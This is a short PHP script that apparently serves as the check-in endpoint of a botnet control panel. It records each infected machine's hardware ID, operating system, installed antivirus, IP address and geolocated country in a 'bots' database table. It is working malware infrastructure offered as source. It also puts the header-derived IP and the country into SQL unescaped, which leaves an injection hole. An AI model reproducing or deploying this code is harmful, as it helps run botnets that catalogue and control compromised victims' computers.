<?php
include('connect.php');
$hwid = $_GET['hwid'];
$os = $_GET['os'];
$av = $_GET['av'];

function GetIP() {
  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
  } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  }
  return $ip;
}

$ip = GetIP();

$ch = curl_init('http://free.ipwhois.io/json/'.$ip);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$json = curl_exec($ch);
curl_close($ch);
$ipwhois_result = json_decode($json, true);
$country = $ipwhois_result['country_code'];

$check = mysqli_query($mysqli, "SELECT * FROM `bots` WHERE `hwid`='".mysqli_real_escape_string($mysqli, $hwid)."'");
if(mysqli_num_rows($check) > 0)
{
    exit(0);
}

mysqli_query($mysqli, "
    INSERT INTO `bots` 
    SET `ip`='" . $ip . "', 
        `country`='$country', 
        `hwid`='" . mysqli_real_escape_string($mysqli, $hwid) . "', 
        `checked`='false',
        `OS`='" . mysqli_real_escape_string($mysqli, $os) . "',
        `AV`='" . mysqli_real_escape_string($mysqli, $av) . "'
");

mysqli_close($mysqli);    
?>